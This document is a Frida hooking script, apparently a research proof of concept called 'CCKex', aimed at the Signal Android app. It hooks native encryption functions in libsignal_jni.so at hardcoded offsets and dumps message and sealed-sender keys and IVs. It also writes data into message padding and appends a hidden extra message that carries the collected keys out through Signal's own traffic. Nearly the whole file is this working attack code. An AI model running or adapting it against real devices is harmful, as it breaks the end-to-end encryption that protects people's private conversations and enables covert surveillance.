

var key_dump_file = null;
var key_data = [];

var ext_logging = false;
var pixel_deploy = false;

var find_msg_crypto_buffer = false;
var find_ses_crypto_buffer = false;

main()

function main() {
	console.log("\n-------------------=+ CCKex +=-------------------\n");
	console.log("Creating Hooks..");

	//key_dump_file = new File("/sdcard/Download/" + Date.now() + "_cap.keylist", "a");

	Java.perform(() => { hook_signal_http_websocket_layer() });

	if(pixel_deploy) {
		// arm64 hooks
		hook_signal_e2ee_encryption("libsignal_jni.so", 0x036a1b0, 0x0325c48);
	} else {
		// x86_64 hooks
		// old 0x03f78cf, 0x03a6338
		hook_signal_e2ee_encryption("libsignal_jni.so", 0x4031b6, 0x3b0493);
	}

}

function printJavaStacktrace() {
	console.log(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Exception").$new()));
}

function hexdump2hexstream(hexdumpstr) {

	var ret = "";

	hexdumpstr.split('\n')
		.forEach(str => {
			ret += str.split(' ').slice(2, -1).join('').substring(0, 32);
		});

	return ret;
}

function hexstream2bytearray(hexstream) {

	var arr = [];

	hexstream = hexstream.replaceAll(' ', '').replaceAll('\n', '');

	for(var i = 0; i < hexstream.length; i += 2) {
		arr.push(Number("0x" + hexstream.substring(i, i + 2)));
	}

	return arr;
}

function calculateEntropy(nativePointer, length) {
	var entropy = 0.0;
	var counts = new Array(0xff).fill(0);

	for(var i = 0; i < length; i++) {
		counts[nativePointer.add(i).readU8()] += 1;
	}

	for(var i = 0; i < 255; i++) {
		var p = counts[i] / length;
		if(p > 0.0) entropy = entropy - p * Math.log2(p);
	}

	return entropy / 8;
}

function searchSignalCryptoBufferHeur(spNative, limit) {
	for(var i = 0; i < limit; i +=0x8) {
		//console.log(this.context["sp"].add(i+0x4).readU32() & 0xffffff00);
		if((spNative.add(i+0x4).readU32() & 0xffffff00) == 0x00007f00) {
			try {
				var zerocount = 0;
				for(var j = 0; j < 0xa0; j++)	{
					if(spNative.add(i).readPointer().add(j).readU8() == 0)	{
						zerocount += 1;
					}
				}
				
				var entropy = calculateEntropy(spNative.add(i).readPointer(), 0xa0);
				
				if(zerocount < 0x20 && entropy > 0.75)	{
					console.log(hexdump(spNative.add(i), {offset: 0, length: 0x8, header:false, ansi: false }));
					console.log(i);
					console.log("Entropy: " + entropy);
					console.log(hexdump(spNative.add(i).readPointer(), {offset: 0, length: 0xa0, header:true, ansi: true }));
				}
			}
			catch(error){
				//console.error(error);
			}
		}
	}
}

const byteToBase64 = (byte) => {
    const key = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    let bytes = new Uint8Array(byte)
    let newBase64 = ''
    let currentChar = 0
    for (let i=0; i<bytes.length; i++) {   // Go over three 8-bit bytes to encode four base64 6-bit chars
        if (i%3===0) { // First Byte
            currentChar = (bytes[i] >> 2)      // First 6-bits for first base64 char
            newBase64 += key[currentChar]      // Add the first base64 char to the string
            currentChar = (bytes[i] << 4) & 63 // Erase first 6-bits, add first 2 bits for second base64 char
        }
        if (i%3===1) { // Second Byte
            currentChar += (bytes[i] >> 4)     // Concat first 4-bits from second byte for second base64 char
            newBase64 += key[currentChar]      // Add the second base64 char to the string
            currentChar = (bytes[i] << 2) & 63 // Add two zeros, add 4-bits from second half of second byte
        }
        if (i%3===2) { // Third Byte
            currentChar += (bytes[i] >> 6)     // Concat first 2-bits of third byte for the third base64 char
            newBase64 += key[currentChar]      // Add the third base64 char to the string
            currentChar = bytes[i] & 63        // Add last 6-bits from third byte for the fourth base64 char
            newBase64 += key[currentChar]      // Add the fourth base64 char to the string
        }
    }
    if (bytes.length%3===1) { // Pad for two missing bytes
        newBase64 += `${key[currentChar]}==`
    }
    if (bytes.length%3===2) { // Pad one missing byte
        newBase64 += `${key[currentChar]}=`
    }
    return newBase64
}

function hook_signal_http_websocket_layer() {

	// TODO: this currently does nothing / crashes ???
	//Java.deoptimizeEverything();

	//const target_search_str = "*PushServiceSocket*!*buildServiceRequest*";
	const target_search_str = "*!*buildServiceRequest*";

	//console.log("Searching for " + target_search_str);
	const target_method_arr = Java.enumerateMethods(target_search_str);
	
	console.log(JSON.stringify(target_method_arr, null, 2));

	if(target_method_arr.length != 1) {		// check to avoid multiple or none results
		console.log("Multiple or none matches:");
		console.log(JSON.stringify(target_method_arr, null, 2));
		return;
	}

	// assign found class loader to Java.classFactory to use Java.use
	Java.classFactory.loader = target_method_arr[0].loader;

	// Fetch class and then method to modify the method
	console.log("Attaching to PushServiceSocket.buildServiceRequest");
	const pushServiceSocketClass = Java.use('org.whispersystems.signalservice.internal.push.PushServiceSocket');

	/////////////////////////////////
	// HOOK OutgoingPushMessageList 
	console.log(" ------------------ Choosing OutgoingPushMessageList ------------------ ");
	
	let classLoaders = Java.enumerateClassLoadersSync();

	Java.enumerateClassLoadersSync().forEach(loader => {
		console.log("Using class Loader: " + JSON.stringify(loader, null, 2));
		Java.classFactory.loader = loader;
		try {
			const OutgoingPushMessageList = Java.use('org.whispersystems.signalservice.internal.push.OutgoingPushMessageList');
			const OutgoingPushMessage = Java.use('org.whispersystems.signalservice.internal.push.OutgoingPushMessage');

			console.log("Attaching to " + JSON.stringify(OutgoingPushMessageList, null, 2) + " ..");
			OutgoingPushMessageList.$init.overload(
				'java.lang.String',
				'long',
				'java.util.List',
				'boolean',
				'boolean'
			).implementation = function(arg0, arg1, arg2, arg3, arg4) {
		
				// Abort interceptions with no message in the OutgoingPushMessageList
				if(arg2.size() == 0) return;
				
				var proto_key_data = [0xa2, 0x01, key_data.length, ...key_data];
			
				var proto_key_data_base64 = byteToBase64(proto_key_data);

				console.log("INJECTING MESSAGE INTO LIST!");
				//console.log(JSON.stringify(proto_key_data, null, 2));
				console.log(proto_key_data_base64);

				// get first message
				var message = Java.cast(arg2.get(0), OutgoingPushMessage);
				var payloadMessage = OutgoingPushMessage.$new(6, message.destinationDeviceId.value, message.destinationRegistrationId.value, proto_key_data_base64);
		
				key_data = [];

				//printJavaStacktrace();
				arg2.add(payloadMessage);

				return this.$init(arg0, arg1, arg2, arg3, arg4);
			};

			if(ext_logging) {
				console.log("Hooked OutgoingPushMessageList!");

				const WebSocketRequestBuilder = Java.use('org.whispersystems.signalservice.internal.websocket.WebSocketRequestMessage$Builder');
				console.log("Attaching to " + JSON.stringify(WebSocketRequestBuilder, null, 2) + " ..");

				WebSocketRequestBuilder.$init.overload().implementation = function() {
					console.log("Intercepted WebSocketRequest$Builder.init");
					return this.$init();
				};

				WebSocketRequestBuilder.verb.overload('java.lang.String').implementation = function(arg0) {
					console.log("Intercepted WebSocketRequest$Builder.verb: " + JSON.stringify(arg0, null, 2));
					return this.verb(arg0);
				};

				WebSocketRequestBuilder.path.overload('java.lang.String').implementation = function(arg0) {
					console.log("Intercepted WebSocketRequest$Builder.path: " + JSON.stringify(arg0, null, 2));
					return this.path(arg0);
				};

				WebSocketRequestBuilder.class.getFields().forEach(method => {
					console.log("Method: " + method.toString());
				});
			}

			const WebSocketRequestMessage = Java.use('org.whispersystems.signalservice.internal.websocket.WebSocketRequestMessage');
			const JavaString = Java.use('java.lang.String');

			// Disable Header injection for now as it causes a CloseNotify

			/*WebSocketRequestBuilder.build.overloads.forEach(buildMethod => {
				buildMethod.implementation = function() {
				
					// check if Referer header is already included
					for(var i = 0; i < this._headers.value.size(); i++) {
						if(Java.cast(this._headers.value.get(i), JavaString).toString().includes("Referer")) return buildMethod.call(this);
					}

					console.log("Intercepted WebSocketRequest$Builder.build: Injecting Data into headers..");	
					this._headers.value.add("Referer:Test");
					var ret = buildMethod.call(this);
					var request = Java.cast(ret, WebSocketRequestMessage);
					console.log(request.toString());
					return ret;
				}
			});*/

		} catch(e) {
			// probably the wrong loader
			//console.error(e);
			//console.log("Failed to hook OutgoingPushMessageList");
		}
	});
	
	// reset custom class loader
	Java.classFactory.loader = null;
}

var injection_data = "Lorem ipsum dolor sit amet. Id sunt pariatur ea magnam facere est incidunt ipsum ea nihil quia? Et quibusdam esse ut internos illo est corporis dolore aut nisi laudantium. 33 dicta laboriosam aut quas commodi et sunt quibusdam sed omnis cumque.Est sequi quas sed temporibus nostrum ad ullam consequuntur. Ut architecto excepturi aut explicabo harum qui consequatur expedita et nostrum nostrum. Eos ullam laboriosam aut sunt mollitia et nobis officiis est reiciendis dolores! Vel dolorem architecto ut earum quaerat et enim atque quo impedit dolores aut obcaecati dolore rem recusandae ipsum ea odit quia. Vel similique nisi quo quibusdam unde aut dolore dolorem 33 vero repellendus ut magnam nesciunt in voluptate quos est consequatur blanditiis. Sit dolor atque At quos soluta qui magnam perspiciatis in repellat molestiae rem doloremque numquam qui itaque necessitatibus aut quos praesentium? A quaerat repudiandae et tenetur excepturi est maxime sequi qui totam ullam et velit saepe.";

function hook_signal_e2ee_encryption(telegram_message_lib_name, encrypt_function_offset, sesndr_encrypt_function_offset) {
	var msg_lib_module = Process.findModuleByName(telegram_message_lib_name);

	if(msg_lib_module != null) {

		console.log("Found '" + telegram_message_lib_name + "' @ " + JSON.stringify(msg_lib_module["base"]))

		// attach interceptor to the aes_256_cbc_encrypt function to leak keys and data
		var target_addr = msg_lib_module["base"].add(encrypt_function_offset);
		console.log("Attaching to aes_256_cbc_encrypt @ " + JSON.stringify(target_addr));

		Interceptor.attach(target_addr, {
			onEnter(args) {

				console.log("DETECTED NEW OUTGOING MESSAGE!");

				if(ext_logging) {
					for(var i = 0; i < 7; i++) {
						console.log("parameter " + i + ": " + args[i].toInt32());
					}

					// leak key, iv and raw, unencrypted data
					console.log("KEY:");
					console.log(hexdump(args[3], {
						offset: 0,
						length: args[4].toInt32(),
						header: false,
						ansi: true
					}));

					console.log("IV:");
					console.log(hexdump(args[5], {
						offset: 0,
						length: args[6].toInt32(),
						header: false,
						ansi: true		
					}));

					console.log("DATA:");
					console.log(hexdump(args[1], {
						offset: 0,
						length: args[2].toInt32(),
						header: true,
						ansi: true
					}));
				}

				this.tmpaddr = args[1];

				this.dumpstr =
					hexdump2hexstream(hexdump(args[3], { offset: 0, length: args[4].toInt32(), header: false, ansi: false})) + " " +
					hexdump2hexstream(hexdump(args[5], { offset: 0, length: args[6].toInt32(), header: false, ansi: false})) + '\n';

				// inject data into message padding
			
				this.message_ptr = args[1];

				var message_buf_size = args[2].toInt32();
				var message_buf = args[1];

				var offset = 0;
				var curVal = 0;
				for(var i = message_buf_size - 1; i >= 0; i--) {
					curVal = message_buf.add(i).readU8();
					if(curVal == 0x80) {
						// found end of serialized message
						offset = i;
						break;
					} else if (curVal != 0x0) {
						// message malformed abort
						console.log("=> Found byte != 0x0 before 0x80 -> message malformed -> abort (" + message_buf[i] + ")");
						return;
					}
				}

				message_buf.add(offset    ).writeU8(0xa2);	// LSB of TAG Varint
				message_buf.add(offset + 1).writeU8(0x01);	// MSB of TAG Varing

				var payload_len = (message_buf_size - 3) - (offset + 3);

				if (payload_len >= 0x80) {	// 2-byte varint
					message_buf.add(offset + 2).writeU8(0x80 | (payload_len & 0x7f));
					message_buf.add(offset + 3).writeU8((payload_len >> 7) & 0x7f);
					offset = offset + 4;
				} else {	// 1 -byte varint
					message_buf.add(offset + 2).writeU8(payload_len);	// Length of Content
					offset = offset + 3;
				}

				message_buf.add(offset).writeUtf8String(injection_data.substring(0, payload_len));		// write payload
				offset = offset + payload_len;

				message_buf.add(offset).writeU8(0x80);	// PaddingStart Byte

				this.message_len = args[2].toInt32();

				if(ext_logging) {
					console.log("INJECTED DATA:");
					console.log(hexdump(args[1], {
						offset: 0,
						length: args[2].toInt32(),
						header: true,
						ansi: true
					}));
				}
			},
			onLeave(retval) {
		
				if(this.dumpstr == null) return;

				// use this to find ciphertext in nice rust binaries
				if(find_msg_crypto_buffer) {
					searchSignalCryptoBufferHeur(this.context["sp"], 0x1000);
					console.log(this.dumpstr);
					return;
				}

				var buf = null;
				if(pixel_deploy) {
					//buf = new NativePointer(retval);//.add(0x50).readPointer(); 
					buf = this.context["sp"].add(0xa90).add(0x8).readPointer();
					//buf = this.message_ptr;
				} else {
					//buf = new NativePointer(retval);
					buf = this.context["sp"].add(0xc0).readPointer();
					//buf = this.tmpaddr;
				}
				
				if(ext_logging) {
					console.log("MESSAGE CIPHERTEXT:");
					console.log(JSON.stringify(retval, null, 2));
					if(pixel_deploy)	{
						console.log(hexdump(this.context["sp"].add(0xa90), {offset: 0, length: 0xff, header:true, ansi: true }));
					}
					console.log(hexdump(buf, { offset: 0, length: (this.message_len + 1) * 2, header:true, ansi: true }));
				}

				this.dumpstr = hexdump2hexstream(hexdump(buf, { offset: 0, length: 4, header: false, ansi: false })).substring(0, 8) + " " +
									this.dumpstr;

				console.log("Dumping message key to Keylog file: " + this.dumpstr);
			
				if(key_dump_file != null) {
					key_dump_file.write(this.dumpstr);
					key_dump_file.flush();
				}

				key_data.push(0xff);
				key_data.push(0xff);
				
				var arr = hexstream2bytearray(this.dumpstr);

				key_data.push(arr.length);
				key_data.push(...arr);
			}
		});

		// attach interceptor to the aes256_ctr_hmacsha256_encrypt function to leak keys and data
		var target_addr = msg_lib_module["base"].add(sesndr_encrypt_function_offset);
		console.log("Attaching to aes256_ctr_hmacsha256_encrypt @ " + JSON.stringify(target_addr));	

		Interceptor.attach(target_addr, {
			onEnter(args) {

				console.log("DETECTED SEALED SENDER ENCRYPTION:");
	
				// filter out encryption of identity key ?
				if(args[2].toInt32() == 33) {
					console.log("=> Filtered out encryption of identity key.");
					return;
				}
	
				if(ext_logging) {

					for(var i = 0; i < 5; i++) {
						console.log("param<" + i + "> = " + args[i].toInt32());
					}

					console.log("DATA:");
					console.log(hexdump(args[1], {
						offset: 0,
						length: args[2].toInt32(),
						header: true,
						ansi: true
					}));

					console.log("ENC-KEY:");
					console.log(hexdump(args[3], {
						offset: 0,
						length: 32,
						header: false,
						ansi:false
					}));

					/*console.log("MAC-KEY:");
					console.log(hexdump(args[4], {
						offset: 0,
						length: 32,
						header: false,
						ansi: false
					}));*/
				}

				this.sealed_sender_length = args[2].toInt32();
				this.dumpstr = hexdump2hexstream(hexdump(args[3], { offset: 0, length: 32, header: false, ansi: false})) + '\n'

				//console.log(JSON.stringify(this.context, null, 2));

			},
			onLeave(retval) {

				//console.log(JSON.stringify(this.context, null, 2));

				if (this.dumpstr == null) return;

				// use this to find ciphertext in nice rust binaries
				if(find_ses_crypto_buffer) {
					searchSignalCryptoBufferHeur(this.context["sp"], 0x1000);
					console.log(this.dumpstr);
					return;
				}

				var buf = null;
				if(pixel_deploy) {
					buf = this.context["sp"].add(0x28).readPointer();
				} else {
					buf = this.context["sp"].add(0x60).readPointer();
				}

				if(ext_logging) {
					console.log("DAS IST EIN TEST:");
					console.log(JSON.stringify(buf, null, 2));
					console.log(hexdump(this.context["sp"], { offset: 0, length: 0xff, header: true, ansi: true }));
				}

				this.dumpstr = hexdump2hexstream(hexdump(buf, { offset: 0, length: 4, header: false, ansi: false })).substring(0, 8) + " " +
									this.dumpstr;

				console.log("Dumping sealed sender key to Keylog file: " + this.dumpstr);

				if(ext_logging) {
					console.log(hexdump(buf, { offset: 0, length: this.sealed_sender_length, header: true, ansi: true }));
				}

				if(key_dump_file != null) {
					key_dump_file.write(this.dumpstr);
					key_dump_file.flush();
				}

				key_data.push(0xff);
				key_data.push(0xfe);
				
				var arr = hexstream2bytearray(this.dumpstr);

				key_data.push(arr.length);
				key_data.push(...arr);

			}
		});

	} else {
		console.log("Failed to find telegram libtmessage library '" + telegram_message_lib_name + "'.");
	}
}
